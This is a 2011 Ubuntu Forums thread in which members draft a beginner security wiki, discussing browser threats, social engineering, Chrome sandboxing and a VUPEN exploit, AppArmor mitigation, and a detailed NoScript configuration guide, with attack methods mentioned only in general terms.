In the case of the DNS / ARP poisoning if the site cloned is SSL you're  not going to have their SSL certificate, so a decent amount of paying  attention should alert the user that the site isn't legit. If it's not  an SSL site, then there isn't a lot of warning you will get. However,  decent browser security measures (addons) should stop the majority of  browser exploits. Of course someone could just harvest all the GET/POST  requests on the site and probably come up with your credentials, but  that narrows it down to a pretty targeted attack. I think we're kind of on the same page here, IMO a lot of this is already covered by browser security in a general sense.  To go into more detail would make it NOT a beginner Wiki.  

The other thread that got banished to "recurring discussions" made me realize that we need to convince people that it's the browser to worry about, not viruses.  So I think this is where we should focus our attention rather than the details of what specific things to watch out for on the web.  We'd be preaching to the choir if we focused on fake sites because the "Linux is secure" crowd says "I don't click on those so I'm not worried."

I made some edits to browser security & to the linux vulnerability sections.  Hopefully everyone can check it out.

---

### Post by Dangertux on 2011-11-12
> **Ms. Daisy said:**
> I seized upon it and stuck it in the Wiki nearly verbatim. I think we're kind of on the same page here, IMO a lot of this is already covered by browser security in a general sense.  To go into more detail would make it NOT a beginner Wiki.  

The other thread that got banished to "recurring discussions" made me realize that we need to convince people that it's the browser to worry about, not viruses.  So I think this is where we should focus our attention rather than the details of what specific things to watch out for on the web.  We'd be preaching to the choir if we focused on fake sites because the "Linux is secure" crowd says "I don't click on those so I'm not worried."

I made some edits to browser security & to the linux vulnerability sections.  Hopefully everyone can check it out.

I'll go take a look at it in a few minutes. If you want a link to faked sites and social-engineering stuff I suggest looking at the site I'm going to PM you

The guy that runs that site is pretty much the premier shmoozer of the hacker universe. There are also a ton of demos and explanations of pretty much every SE technique you could imagine.

Hopefully that will be helpful though its borderline since he does also maintain the Social Engineering Toolkit , which is probably not necessarily something we'd want to introduce to the average newbie, since I don't feel like making sure I'm typing my credentials into the actual Ubuntu Forums every morning.

---

### Post by Ms. Daisy on 2011-11-12
> **Dangertux said:**
> I'll go take a look at it in a few minutes. If you want a link to faked sites and social-engineering stuff I suggest looking at the site I'm going to PM you

The guy that runs that site is pretty much the premier shmoozer of the hacker universe. There are also a ton of demos and explanations of pretty much every SE technique you could imagine.

Hopefully that will be helpful though its borderline since he does also maintain the Social Engineering Toolkit , which is probably not necessarily something we'd want to introduce to the average newbie, since I don't feel like making sure I'm typing my credentials into the actual Ubuntu Forums every morning.Yes, I think we can include a link to some site, that's probably not the best one. But it's one I'm going to check out for myself!

I found it ironic that the social engineering link you gave me had a monthly newsletter to sign up for.  Really? :P

---

### Post by haqking on 2011-11-12
> **Dangertux said:**
> I'll go take a look at it in a few minutes. If you want a link to faked sites and social-engineering stuff I suggest looking at the site I'm going to PM you

The guy that runs that site is pretty much the premier shmoozer of the hacker universe. There are also a ton of demos and explanations of pretty much every SE technique you could imagine.

Hopefully that will be helpful though its borderline since he does also maintain the Social Engineering Toolkit , which is probably not necessarily something we'd want to introduce to the average newbie, since I don't feel like making sure I'm typing my credentials into the actual Ubuntu Forums every morning.

Bet you are referring to loganWHD aint ya 

oh i reread what you wrote, dont take any phone calls from ReL1K ;-)

---

### Post by haqking on 2011-11-12
> **Ms. Daisy said:**
> Yes, I think we can include a link to some site, that's probably not the best one. But it's one I'm going to check out for myself!

**I found it ironic that the social engineering link you gave me had a monthly newsletter to sign up for**.  Really? :P

Feel free to give ReL1K your email address....LOL

---

### Post by Dangertux on 2011-11-12
> **haqking said:**
> Bet you are referring to loganWHD aint ya 

oh i reread what you wrote, dont take any phone calls from ReL1K ;-)

loganWHD and muts contribute to his project considerably lol.

Nah he's legit , I 've met him before and he's a really cool guy and gives some rather informative presentations. I signed up for the news letter lol. Besides he makes entirely too much money to be SE'ing us. Now if he called me up or emailed me and tried to get me to take any action, I would definitely be skeptical lol.

---

### Post by haqking on 2011-11-12
> **Dangertux said:**
> loganWHD and muts contribute to his project considerably lol.

Nah he's legit , I 've met him before and he's a really cool guy and gives some rather informative presentations. I signed up for the news letter lol. Besides he makes entirely too much money to be SE'ing us. Now if he called me up or emailed me and tried to get me to take any action, I would definitely be skeptical lol.

I could listen to muts voice all day long, the russian/croatian sounding lisp is so soothing...LOL

---

### Post by Thewhistlingwind on 2011-11-12
> **Dangertux said:**
> I don't run apparmor/SELinux profiles for anything, don't use anti-malware I downgraded to a 2.4 series kernel, **my machine is directly connected **and I'm running MySQL 5.1 with OpenSSL (YaSSL) 1.9.8 as root , no firewall, and no IDS. My hypocracy knows no bounds.


You really don't have the time to get a $15 router from your local thrift store and dd-wrt it?

:P

That's fine, I'm lazy too.

---

### Post by jramshu on 2011-11-12
Send me the link too DT.

You guys better pay attention to what DT is telling you. I have seen sites that have been hacked and when you visit them you get a "the url for this page has changed, please wait while you are redirected".
You are then redirected to a page that looks exactly like the page you were looking for.....only now it's on the "crackers" server. How? 
Once you 'crack' the website you can copy the pages you want, throw in a URL redirect and walla, you got yourself an easy way to get usernames and passwords. Or dump the db and try and crack the hash:salt.

Is it Ubuntu specific? No, it's every OS they are after. There are 'cracks' showing up in the newer kernels. 
I also hate to inform you but a large majority of 'crackers' are cracking Linux boxes with Windows. The better ones are fluent in both OS's. They (the better ones) are also fluent in MySQL Syntax, MSSQL Syntax, PHP, Python, Perl, C++, JavaScript, Visual Basic, .NET, etc. etc. 

You get my drift.

EDIT: Another handy tool is OWASP Mantra. It has a ton of tools and it's portable.

Oh yeah DT. My server is the same except newer kernel. I have older versions of Joomla and Drupal etc... I watch people hit them all the time. I had to shut off the site side of it because my wife was complaining about the internet slowing down. hahahaha

If any of this is inappropriate moderators, please just delete it. It seems far from full disclosure.

---

### Post by Dangertux on 2011-11-12
> **jramshu said:**
> Send me the link too DT.

You guys better pay attention to what DT is telling you. I have seen sites that have been hacked and when you visit them you get a "the url for this page has changed, please wait while you are redirected".
You are then redirected to a page that looks exactly like the page you were looking for.....only now it's on the "crackers" server. How? 
Once you 'crack' the website you can copy the pages you want, throw in a URL redirect and walla, you got yourself an easy way to get usernames and passwords.

Is it Ubuntu specific? No, it's every OS they are after. There are 'cracks' showing up in the newer kernels. 
I also hate to inform you but a large majority of 'crackers' are cracking Linux boxes with Windows. The better ones are fluent in both OS's. They (the better ones) are also fluent in MySQL Syntax, MSSQL Syntax, PHP, Python, Perl, C++, JavaScript, Visual Basic, .NET, etc. etc. 

You get my drift.

EDIT: Another handy tool is OWASP Mantra. It has a ton of tools and it's portable.

Oh yeah DT. My server is the same except newer kernel. I have older versions of Joomla and Drupal etc... I watch people hit them all the time. I had to shut off the site side of it because my wife was complaining about the internet slowing down. hahahaha

Umm.. I hate to be the bearer of bad news, but have you guys experimented with the wget command. No cracking necessary.

Yes Mantra is nice too. 

I was joking about the 2.4 kernel I guess it got taken seriously. I'm using a pretty much baseline install of Fedora 15 on my personal machine. I also dual boot BT5 with a horde of VM's for demos. :-)

---

### Post by jramshu on 2011-11-12
> **Dangertux said:**
> Umm.. I hate to be the bearer of bad news, but have you guys experimented with the wget command. No cracking necessary.


(EDITED OUT by me.)

I have also been seeing a lot of router cracks surfacing here lately. So people need to be careful about sites. Like it's been said before, it's not hard to harvest ip's and sometime deviants will try and exploit your router to gain local network access. (edited out by me)

Moderators, delete as seen necessary.

EDIT: Right now I am running a LAMP stack 10.10 server with all the latest updates. So far no one has been able to crack it. It's not even fully patched for sqli vulnerabilities. You do however have to do it blind, lol. Also Apache is ignoring the .htaccess file, though there is a way around that anyway.

---

### Post by Dangertux on 2011-11-12
Well I think that it's probably best not to derail the thread too much, since Cracking 101 probably isn't supported on this forum. That being said kernel level exploitation and server are somewhat outside of the scope of this discussion. Of course if you want to discuss that feel free to PM me and we can talk about it.

As far as the router thing goes, that's actually pretty relevant, though not Ubuntu specific. Alot of ideas about NAT pinning , though that has become very tough to accomplish with upgraded firmware on most routers. Then you have DNS based attacks, again it's not really Ubuntu-centric, though it can be mentioned under the Social Engineering heading, since it's just another method to make a site look "legit"

---

### Post by jramshu on 2011-11-12
I hear ya. TMI. 
I'll stop, I don't want to hijack the thread. I also don't want to disclose anything inappropriate.

If a mod deletes it I'll completely understand.

EDIT: I edited out a bunch. Couldn't help but jump on the wget side, sorry. Could you edit the quote DT. Thanks

---

### Post by jramshu on 2011-11-12
Thanks DT.

Sometimes what I feel everyone should know turns out to be a short tut on cracking. And, since that went outside the desktop side, pointless here.

Another thing on file permissions, don't forget that .bak are usually not well protected. They can be read, just not modified. So keeping track of ones that contain sensitive info is kinda important too.

---

### Post by Ms. Daisy on 2011-11-12
> **Dangertux said:**
> Well I think that it's probably best not to derail the thread too much, since Cracking 101 probably isn't supported on this forum. That being said kernel level exploitation and server are somewhat outside of the scope of this discussion. Of course if you want to discuss that feel free to PM me and we can talk about it.

As far as the router thing goes, that's actually pretty relevant, though not Ubuntu specific. Alot of ideas about NAT pinning , though that has become very tough to accomplish with upgraded firmware on most routers. Then you have DNS based attacks, again it's not really Ubuntu-centric, though it can be mentioned under the Social Engineering heading, since it's just another method to make a site look "legit"We've got router info under the "home network" section.  We've actually got several links on general router safety, but it's not specifically summarized in the Wiki.  Again in the interest of keeping it short & sweet.

jramshu- if you've got a good link summarizing the points you're bringing up, then we can link to it in the Wiki.

And on another note... when are we done with this beast?  How's it looking?  It's not a comprehensive guide to all things locked down tighter than a chastity belt, but it's not intended to be.  Is it a decent first-step towards security article yet?

---

### Post by Dangertux on 2011-11-12
> **Ms. Daisy said:**
> We've got router info under the "home network" section.  We've actually got several links on general router safety, but it's not specifically summarized in the Wiki.  Again in the interest of keeping it short & sweet.

jramshu- if you've got a good link summarizing the points you're bringing up, then we can link to it in the Wiki.

And on another note... when are we done with this beast?  How's it looking?  It's not a comprehensive guide to all things locked down tighter than a chastity belt, but it's not intended to be.  Is it a decent first-step towards security article yet?

I think it looks pretty good so far there were a couple of things I think need expounded on a little bit. The browser security section being a big one. Possibly some sample configs or walkthroughs don't know if anyone has a link to some but I can work with that if need be.

also the answer to this question

> 
 [B]If you are surfing the net and come across a "drive-by  download" site, if your privileges are not elevated then it is less  likely to execute. IS THIS TRUE?
[/B]No it's not true. It's just as likely to execute, however what it has access to changes dramatically if it has lowered privileges.

I think there are a few things about sudo that need to be expounded on a little I will elaborate later as I have some things to take care of (food) atm.

Otherwise its looking good.

---

### Post by Thewhistlingwind on 2011-11-12
> **jramshu said:**
> Thanks DT.

Sometimes what I feel everyone should know turns out to be a short tut on cracking. And, since that went outside the desktop side, pointless here.


I think that IT education shouldn't even be optional by this point. If you don't "get" computing, your at a significant disadvantage in the workforce.

If some of the things you need to know end up as short cracking tutorials, oh well.

---

### Post by OpSecShellshock on 2011-11-12
At the very least, here's the [FAQ for NoScript]("http://noscript.net/faq"). I seem to remember it being a bit more comprehensive, like going over the options tab-by-tab and explaining what everything is, but now it doesn't seem to do that. It's still work linking, I think. Again, this is one of those things where new users should be encouraged to take the time to flip switches and see what breaks. They can't do anything that can't be undone just as easily.

As regards BetterPrivacy: people should understand that if they don't have the Flash plugin then they'll see error messages because it won't have a path specified. Actually if they do have the Flash plugin but haven't run any Flash objects yet, there still won't be a path. The thing to do is run Flash content, then immediately call up BetterPrivacy (Tools-->BetterPrivacy). That way there's sure to be a .macromedia folder to empty out. As far as the options, on mine I have everything checked except "delete on a timer" and "notify when a new object is stored." The second one I may end up enabling because I often get taken by surprise.

I don't find that Adblock Plus needs much tweaking.

Some people swear by WOT, but I think it's a waste of time and energy, based mostly on the reports of people who are not security or tech folks, and as such prone to both false positives and false negatives. Like any reputation-based services, really.

Bleachbit is not installed by default but is in the USC. I like to run it after every browsing session. When doing that, don't use the option to run as root. Hit the super key to bring up the dash, then type "ble," hit the down arrow, then Enter to open. Take a moment to feel awesome for only using the keyboard. There are a lot of options here, but focus on the browser. Check the box next to the name of the browser, which will automatically check all the boxes under it. Then UNcheck Vacuum and if you store passwords in the browser then uncheck that, too. Check the box next to Flash. If Java is installed check that, too. Then click Preview, then Delete. Almost too easy. The things that were checked will still be checked the next time it opens.

---

### Post by jramshu on 2011-11-12
> **Thewhistlingwind said:**
> I think that IT education shouldn't even be optional by this point. If you don't "get" computing, your at a significant disadvantage in the workforce.

If some of the things you need to know end up as short cracking tutorials, oh well.

Though I do agree with you the forums rules don't allow full disclosure on security.;)

The advantage that crackers have is they are constantly developing and using new methods. Most are keeping the exploits private. To leak a private one would lead to a good DOXing.

You wouldn't want my links on your wiki lol. Would draw too much attention.

EDIT: Use konqueror and make sure java and js are disabled. It will keep your browser and os from being fingerprinted. Some sites use other methods to id the TCP stack.

---

### Post by vanhenryjr on 2011-11-12
Well maybe I am an idiot, but after 4 days of "no script" as an add-on, I just can't take it anymore. Why have a computer at all if I can't use the internet-watch a football game on ESPN3, or read an online newspaper? I will just accelerate my learning curve and learn on how back up and re-install often.

---

### Post by Ms. Daisy on 2011-11-12
> **vanhenryjr said:**
> Well maybe I am an idiot, but after 4 days of "no script" as an add-on, I just can't take it anymore. Why have a computer at all if I can't use the internet-watch a football game on ESPN3, or read an online newspaper? I will just accelerate my learning curve and learn on how back up and re-install often.We definitely don't say you should never allow any script ever. May as well toss out the machine if you do that. You can allow scripts in Noscript.  If you click on "option" in the bottom right-hand side of the screen you can choose to "allow espn.com" or whatever the website is.  You can permanently allow it if you trust the site.

There's one site I go to that I have to "allow all this page" in order to get any functionality at all.  I chose to trust that particular site & allowed it all.

---

### Post by crazyguy510 on 2011-11-12
I'm going to have to agree with Daisy. If your using Firefox, then you should be using noScript. It's not convenient, but it's ultimately for the best. 

You could always switch to Chrome which uses sandboxing to protect from malware. I think I would be correct in saying that noScript is not really needed in Chrome because all websites are sandboxed from accessing the OS.

---

### Post by haqking on 2011-11-12
> **crazyguy510 said:**
> I'm going to have to agree with Daisy. If your using Firefox, then you should be using noScript. It's not convenient, but it's ultimately for the best. 

You could always switch to Chrome which uses sandboxing to protect from malware. I think I would be correct in saying that noScript is not really needed in Chrome because all websites are sandboxed from accessing the OS.

[http://www.vupen.com/demos/VUPEN_Pwning_Chrome.php](http://www.vupen.com/demos/VUPEN_Pwning_Chrome.php)

Also the sandboxing in chrome takes advantage primarily of windows security mechanisms, in Linux there are a few more options for it and the API's are different

besides the whole sandboxing thing is yet another lull into false sense of security, though chrome did survive the pwn2own contest for 3 years running

Also Notscript exists for Chrome as the Noscript alternative, it works but is not as user friendly as its firefox counterpart.

---

### Post by vasa1 on 2011-11-12
> **haqking said:**
> [http://www.vupen.com/demos/VUPEN_Pwning_Chrome.php](http://www.vupen.com/demos/VUPEN_Pwning_Chrome.php)

Also the sandboxing in chrome takes advantage primarily of windows security mechanisms, in Linux there are a few more options for it and the API's are different

besides the whole sandboxing thing is yet another lull into false sense of security, though chrome did survive the pwn2own contest for 3 years running

Also Notscript exists for Chrome as the Noscript alternative, it works but is not as user friendly as its firefox counterpart.

I've seen the vupen link so often. But isn't it old, stale, irrelevant? How does it matter **today**? Hasn't Chrome/Chromium moved on?

---

### Post by haqking on 2011-11-12
> **vasa1 said:**
> I've seen the vupen link so often. But isn't it old, stale, irrelevant? How does it matter **today**? Hasn't Chrome/Chromium moved on?

no exploit is stale or irrelevant when it comes to security.

The vulnerability was discovered earlier this year and that exploit works for 11 through to 14, not sure about 15 but it is still relevant.

Anyways the point was that alot of people again think they are secure with a product, and with the whole sandboxing thing in chrome people sway this way yet again and it is not true.

---

### Post by Dangertux on 2011-11-12
I just posted this here... If someone thinks it needs its own thread  feel free to make it so or tell me to make it so and I'll make the  thread and delete this, it just isn't really Ubuntu-centric and its more  relevant to this discussion. 

P.S : If you guys like it I can jusjt copy paste it to the wiki ;-)

So yeah...lol.. Also the VUPEN thing -- You guys clearly haven't seen the new Chrome POC's. It's getting nasty (they're paying $1000+ for anyone who wants to do the research and submit POC though)
[B][SIZE=2]
DT's NoScript Configuration Guide[/SIZE][/B]

This is a quick run-through of configuring NoScript under Firefox. You can get NoScript here : [http://noscript.net/getit](http://noscript.net/getit)



Click the NoScript (S) icon next to your URL bar in firefox and choose "Options"


**[SIZE=2]General Tab[/SIZE]**

Default Settings are Fine

**[SIZE=2]Whitelist Tab[/SIZE]**

You should add a list of frequently visited sites that you trust. Please note Whitelisting a site will not stop NoScript from protecting you from XSS/CSRF and ABE violations (we'll explain this more later). You will notice there are already some sites whitelisted for you. If for some reason you do not trust those sites you may highlight them and click "Remove Site" and it will no longer be in the whitelist. You should add trusted top-level sites to make it easier.

Adding a whitelisted site

Simply type the domain of the site into the "Address of Website Bar" and click "Allow" example : [http://ubuntuforums.org](http://ubuntuforums.org) or ubuntuforums.org

[IMG]http://dangertux.no-ip.org/downloads/whitelist.png[/IMG]


After you have whitelisted the sites you commonly visit and trust you are done here.

Note : You need to weight the probability that the site is secure when whitelisting it. For example: [http://canonical.com](http://canonical.com) (probably okay) [http://superleethackersecrets.ru](http://superleethackersecrets.ru) (probably not so much) Keep in mind this is entirely subjective and unless you plan on running a vulnerability assessment against the site all you can do is trust the administration of that site.

[SIZE=2]**Embeddings Tab**[/SIZE]

[IMG]http://dangertux.no-ip.org/downloads/embeddings.png[/IMG]

This is an important tab and we will be modifying the default settings considerably here. Outside of the default settings you probably also want to place a check in the boxes ("Forbid <IFRAME>", "Forbid <FRAME>", "Forbid WebGL", "No placeholder objects from sites marked as untrusted"). Additionally for ease of use you may wish to choose "Collapse Blocked Objects" this doesn't add or detract security, it just makes sites displaying blocked cross site content display more clearly. 

"Apply these restrictions to Whitelisted Sites" : This should probably be left unchecked unless you are super paranoid and want to break all your favorite sites.

[SIZE=2]**Appearance Tab**[/SIZE]

This is entirely up to you, and depends on how you want NoScript to display itself. I leave it at default, and will not discuss it further here.

[SIZE=2]**Notifications Tab**[/SIZE]

This is how noisy NoScript is going to be. It will not change the amount of protection NoScript gives you, however it will tell you when NoScript alerts you or doesn't alert you to different blocked content or actions. The default settings are fine here as well.
[SIZE=2][B]
Advanced Tab[/B][/SIZE]

These are your advanced NoScript options and contain several sub tabs which we will go through now.
**Untrusted sub-tab**

[IMG]http://dangertux.no-ip.org/downloads/untrusted.png[/IMG]

For untrusted sites you will wish to place a check in the following boxes ("Forbid bookmarklets", "Forbid META redirections inside <NOSCRIPT> tags">
[B]
Trusted sub-tab[/B]

The default settings for this sub tab are acceptable so long as you are not "Trusting" sites that should not be trusted, refer to the same procedure as whitelisting.
[B]
XSS sub-tab[/B]

This tab allows you to configure your cross site scripting protection and whitelisting. It offers the ability for you to enter regular expressions for pattern matching of sites to trust cross site content from. By default the settings in the XSS tab are relatively secure. If you do not know regex I do not suggest attempting to learn here as a typo can lead you from trusting cross-site content from "look alike domains" like fakebook.com as opposed to facebook.com. If you wish to learn about basic regex here is a decent explanation : [http://linuxreviews.org/beginner/tao_of_regular_expressions/](http://linuxreviews.org/beginner/tao_of_regular_expressions/)

**HTTPS sub-tab**

This subtab allows you to force SSL on certain sites (of your choosing) as well as affect SSL cookie behavior. It has two sub-sub-tabs "Behavior" and "Cookies"
[U]
Behavior sub-sub-tab[/U]

[IMG]http://dangertux.no-ip.org/downloads/https.png[/IMG]

I would not recommend using "Force forbid active web content unless it comes from a HTTPS connection" as it will break the vast majority of websites. However I do recommend forcing HTTPS for sites where you store important information and or conduct financial transactions. In my example you can see I added my banks and social networking sites. You may type them in the pane seperating them with newlines. When you have done that move to the "Cookies" sub-sub tab.

_Cookies sub-sub-tab_

[IMG]http://dangertux.no-ip.org/downloads/https2.png[/IMG]

This sub sub tab allows you to force cookie encryption over SSL. All major sites should support this functionality, and as you can see from the example I added the same sites that I chose to force SSL for in the previous tab. You add them in the same manner. Once you are done we can move on to the ABE Tab
[B][SIZE=2]
ABE Tab
[/SIZE][/B]
This stands for Application Boundary Enforcement. This is one of the ways NoScript prevents things like NAT Pinning and some DNS based attacks. The default settings are fine, however its important to understand the major role this plays in your protection. I'm sure many of us know that 192.168.1.1 is a private address, meaning you might find it on your home network. Possibly your router's IP address. That being said, no internet based host should be sending anything to this address. If it is doing so it is likely attempting to use your machine as a relay to send code to another machine on your network, otherwise known as NAT pinning. That being said, if you are hosting a home server, this may cause issues if you are on the same network with the server, so don't freak out of if you get an ABE warning visiting your own website.
[SIZE=2][B]
External Filters Tab[/B][/SIZE]

Again the default settings here are fine. However, a brief overview of what this tab does, it allows you to create filters to block certain MIME types. For those who don't know a MIME type is essentially a file type. Like we all know .jpg is an image, or .fmv is a flash movie file. This allows you to set up filters based on those file types, on a site by site basis. This allows extremely fine grained control, so much so that we're not going to cover it here however if you would like to try to experiment I would suggest picking a content rich site and creating filters one by one to block all the content on the site but the static html. That should get you familiar with MIME type blocking.


After you are done configuring NoScripts Options, make sure "Forbid Scripts Globally" is Enabled (this will not effect your whitelisted sites). Restart your browser and surf safer :-)

---

### Post by OpSecShellshock on 2011-11-12
Good lord, that is one hell of a commitment. Thanks.

---

### Post by Dangertux on 2011-11-12
> **OpSecShellshock said:**
> Good lord, that is one hell of a commitment. Thanks.


No problem, I just hope it helps. I think I hit all the high points, but if I'm missing anything please correct me. Also -- I checked the about:config for NoScript , it didn't seem like there were any configurables in there that aren't edited in the GUI as well.

Hope this is useful.

---

### Post by OpSecShellshock on 2011-11-12
> **Dangertux said:**
> No problem, I just hope it helps. I think I hit all the high points, but if I'm missing anything please correct me. Also -- I checked the about:config for NoScript , it didn't seem like there were any configurables in there that aren't edited in the GUI as well.

Hope this is useful.

That pretty much matched what I had (except for the specific sites in the lists, of course), so if you missed anything then so did I. And I had another look at about:config, and it looks like the entry for allowing javascripts to run when pasted into the URL bar is disabled by NoScript under these settings, so that's good news.*

*For context, every so often you'll run across something on Facebook or some other site that says "copy this text and paste in the URL bar for some awesome thing" but it's a script, and then it runs. That's bad, usually. So in addition to just not doing that, it's good to have NoScript looking out for you.

---

### Post by vasa1 on 2011-11-13
> **haqking said:**
> no exploit is stale or irrelevant when it comes to security.

The vulnerability was discovered earlier this year and that exploit works for 11 through to 14, not sure about 15 but it is still relevant.

Anyways the point was that alot of people again think they are secure with a product, and with the whole sandboxing thing in chrome people sway this way yet again and it is not true.

Point taken about having a false sense of security while using Chrome (**or any security measure for that matter**) but I don't see any available information about the vupen thing. They kept it a secret with the solution available only to their customers. On what basis can we be sure that it still is "relevant" other than claims by vupen which haven't been independently verified?

---

### Post by Dangertux on 2011-11-13
> **vasa1 said:**
> Point taken about having a false sense of security while using Chrome (**or any security measure for that matter**) but I don't see any available information about the vupen thing. They kept it a secret with the solution available only to their customers. On what basis can we be sure that it still is "relevant" other than claims by vupen which haven't been independently verified?

Umm... It is still relevant, and the POC exploit code is posted in the usual places (we can't really tell you where on this forum).

The Mitre CVE is CVE-2011-2841

Also the vulnerability does not exist in versions > 14.0.835.163

---

### Post by jramshu on 2011-11-13
You could also tighten up the sendRefererHeader settings too. 

I'm set at 0 the default is 2.

---

### Post by vasa1 on 2011-11-13
> **Dangertux said:**
> Umm... It is still relevant, ...
Also the vulnerability does not exist in versions **>** 14.0.835.163

That means later than ( = or after) the version you've mentioned? Then it maybe relevant to those who don't update? Chrome stable is now at v15.

And unless something is in the public domain there's no point in "discussing" it in a public forum.

---

### Post by OpSecShellshock on 2011-11-13
> **vasa1 said:**
> That means later than ( = or after) the version you've mentioned? Then it maybe relevant to those who don't update? Chrome stable is now at v15.

And unless something is in the public domain there's no point in "discussing" it in a public forum.

Yes, it means versions after that one. People should be applying security updates when they're available. Taking the mitigation steps is more useful than knowing the finer points of how the exploits work. In a scenario where something malicious is happening, it would be over before the user knew it was happening anyway, and in an application that hasn't been patched an exploit will run whether the user knows how it works or not. Essentially the most relevant piece of information is whether a vulnerability has been addressed by the developer or not.

As far as discussing that stuff here, well, to me it doesn't seem like it's going to add much value to a security guide for new users anyway. And as far as the guts of the exploits and where you can find them, it's not that a lot of these aren't public, but that it doesn't comply with the approved conduct on the forums.

---

### Post by Dangertux on 2011-11-13
> **OpSecShellshock said:**
> Yes, it means versions after that one. People should be applying security updates when they're available. Taking the mitigation steps is more useful than knowing the finer points of how the exploits work. In a scenario where something malicious is happening, it would be over before the user knew it was happening anyway, and in an application that hasn't been patched an exploit will run whether the user knows how it works or not. Essentially the most relevant piece of information is whether a vulnerability has been addressed by the developer or not.

As far as discussing that stuff here, well, to me it doesn't seem like it's going to add much value to a security guide for new users anyway. And as far as the guts of the exploits and where you can find them, it's not that a lot of these aren't public, but that it doesn't comply with the approved conduct on the forums.

+1 all of this. In this circumstance it's irrelevant. The POC is in the public domain however I can't link it to you because it's against the CoC. What I did do is give more than adequate information to research it yourself. 

Also on the NoScript referred bit I'm not sure if altering referrer settings are a great idea for a "baseline" set up as it has the potential to break a lot of sites. Thoughts?

---

### Post by OpSecShellshock on 2011-11-13
> **Dangertux said:**
> Also on the NoScript referred bit I'm not sure if altering referrer settings are a great idea for a "baseline" set up as it has the potential to break a lot of sites. Thoughts?

I manage that using RefControl, which allows the management to be done in the context menu from a right click. However, you don't really know what it's going to break until after it's broken, which carries the risk of interrupting certain transactions. It's also easy to forget about. So for new users it's probably best not to worry about it.

---

### Post by Dangertux on 2011-11-13
> **vasa1 said:**
> That means later than ( = or after) the version you've mentioned? Then it maybe relevant to those who don't update? Chrome stable is now at v15.

And unless something is in the public domain there's no point in "discussing" it in a public forum.


There is something else of relevance in this. When that vulnerability was discovered and exploited it was not immediately patched. This is called a 0 day exploit (meaning it's brand new and nobody has done anything about it yet).

In terms of security, what browser you use isn't going to help you. Many vulnerabilities that are discovered remain in 0 day status for weeks or months while a patch is released. Most vendors have gotten much quicker about patching though. 

That being said if you are really serious about mitigating the 0 day, you really have no choice but apparmor. Even then it won't stop the exploit from working (usually) it will however usually stop the payload from being executed. This is important, because the payload is what actually causes the damage, and allows the attacker to carry out whatever action was desired. The exploit it self is just the delivery method for said payload.

You've probably noticed myself , OpSecShellshock and haqking as well as others repeated use the word mitigate. It is the correct usage because there is no such thing as prevent in terms of 0 day. A 0 day can and will be successful if it exploits a vulnerable service or application on your system, because the vulnerability is there. Mitigation comes in afterwards, in controlling what happens after the service/application is exploited. This is where apparmor helps. If Apparmor is configured properly the exploit will run, probably crash your browser (or whatever is being exploited) and the payload will not properly execute because the application is confined and does not have access to the necessary assets to execute the payload.

Outside of that, you can pretty much configure your firewall properly , keep your sofware updated and hope for the best.  Mitigation is key in terms of the ever changing landscape of browser exploits, particularly if you surf less than carefully.

It is important to note that there are a few other protections in place. Stack protection, ASLR , etc. These are rather trivial for vulnerability researchers to bypass. However, due to the nature of mandatory access controls and the fact that they are often different on a system by system basis, it is much more difficult to bypass them.

---

### Post by haqking on 2011-11-13
> **vasa1 said:**
> That means later than ( = or after) the version you've mentioned? Then it maybe relevant to those who don't update? Chrome stable is now at v15.

And unless something is in the public domain there's no point in "discussing" it in a public forum.

we are not here to explain how to use an exploit, the fact is you said chrome negates the need to noscript protection due to sandboxing, i responded with it is not true which is correct.

The vulnerability exists and is still relevant (as every vulnerability is) not everyone is running upto date or patched software (which is kind of the point of the thread and wiki being born from it.

I wasnt posting to enter a discussion about the exploit itself other than to point out that chrome is not the be all and end all as the exploit has been discovered now and as mentioned there is a app called NotScript as a Noscript replacement.

And all exploits and vulnerabilities will always be valid and relevant (hence the newb guide to security to take steps to negate some of that)

Cheers

---

### Post by vasa1 on 2011-11-13
> **haqking said:**
> ... the fact is **you** said chrome negates the need to noscript protection due to sandboxing, i responded with it is not true which is correct.
...
I'm not sure I said that or anything remotely like that! Could you post the link? Maybe someone else did?

---

### Post by vasa1 on 2011-11-13
Has anyone mentioned pdf files? Apologies if this has been covered.

When I used Windows, I would try not to view pdf files online or even "off-line" but still connected to the 'net.

Even for off-line viewing, I'd turn off javascript ability of the pdf reader (Adobe or Foxit).

Incidentally, can one do that (turn off javascript) in Evince? I didn't see any option for that.

And here's a caution about searching for "images" (among other things):
[http://nakedsecurity.sophos.com/2011/11/12/you-practice-safe-computing-so-why-do-you-still-see-malware/](http://nakedsecurity.sophos.com/2011/11/12/you-practice-safe-computing-so-why-do-you-still-see-malware/)

---

### Post by haqking on 2011-11-13
> **vasa1 said:**
> I'm not sure I said that or anything remotely like that! Could you post the link? Maybe someone else did?

ahh yeah sorry my bad.  My initial posting of the chrome exploit was in response to this [http://ubuntuforums.org/showpost.php?p=11451520&postcount=446](http://ubuntuforums.org/showpost.php?p=11451520&postcount=446) which you then responded to mine about it being out of date.

So yeah my apologies.

But still in response to your post the exploit is still relevant.  Most people on here are not using the latest versions of alot of things (ubuntu, firefox, chrome) etc etc.

And so all vulnerabilities and exploits remain valid.

But we have kind of sidetracked here, it is not so much about a particular exploit or app, but mitigating risks overall as best a user can

Cheers

---

### Post by vasa1 on 2011-11-13
> **haqking said:**
> ... it is not so much about a particular exploit or app, but mitigating risks overall as best a user can


Updating is one easy way and quite a no-brainer. The good thing going for Chrome is that its "tail" is quite short. In other words, it has fewer users who aren't on relatively newer versions. Firefox is having a problem with 3.6.x and let's not think about the Windows world with IE6.

---

### Post by Dangertux on 2011-11-13
> **vasa1 said:**
> Has anyone mentioned pdf files? Apologies if this ha been covered.

When I used Windows, I would try not to view pdf files online or even "off-line" but still connected to the 'net.

Even for off-line viewing, I'd turn off javascript ability of the pdf reader (Adobe or Foxit).

Incidentally, can one do that (turn off javascript) in Evince? I didn't see any option for that.

And here's a caution about searching for "images" (among other things):
[http://nakedsecurity.sophos.com/2011/11/12/you-practice-safe-computing-so-why-do-you-still-see-malware/](http://nakedsecurity.sophos.com/2011/11/12/you-practice-safe-computing-so-why-do-you-still-see-malware/)


I briefly hinted at file format exploits. However -- on an application by application basis it would exceed the focus and scope of the guide that is being written. I do agree that fileformat exploits are important and relevant, however in terms of mitigating the risk involved with them I feel approaching mandatory access controls would be a better option at least in terms of the wiki. The reasoning here being it's more ubuntu-centric, and it is a skill-set that an individual can take to any application.

If you know the mechanics of creating an evince profile, you can learn to create a browser profile, or an irc client profile, etc. It would be a more universally useful skill set. 

